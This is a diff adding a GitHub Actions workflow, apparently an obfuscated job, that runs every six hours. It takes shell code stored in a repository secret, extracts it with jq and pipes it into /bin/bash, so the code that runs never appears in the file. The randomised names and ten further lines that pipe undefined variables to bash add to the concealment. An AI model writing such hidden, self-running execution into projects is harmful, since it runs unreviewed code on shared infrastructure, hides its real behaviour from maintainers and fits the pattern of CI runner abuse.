@@ -1,0 +1,28 @@
+name: zhuiminzhenshi
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '23 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhuiminzhenshi
+        env:
+          klp04: ${{ secrets.klp04 }}
+        run: |
+          echo $klp04 | jq -r .e8835 | /bin/bash
+          echo $o0 | jq -r .npnr4523 | /bin/bash
+          echo $ssoi33 | jq -r .j777 | /bin/bash
+          echo $n47 | jq -r .jx97518 | /bin/bash
+          echo $t48 | jq -r .b30131 | /bin/bash
+          echo $lcbhf7335 | jq -r .onx8 | /bin/bash
+          echo $eeh3004 | jq -r .q2109 | /bin/bash
+          echo $lxi3 | jq -r .pw27102 | /bin/bash
+          echo $drwqp81680 | jq -r .jzcvt34853 | /bin/bash
+          echo $g3405 | jq -r .ceh8 | /bin/bash
+          echo $kvbdy5735 | jq -r .wgt55408 | /bin/bash
+
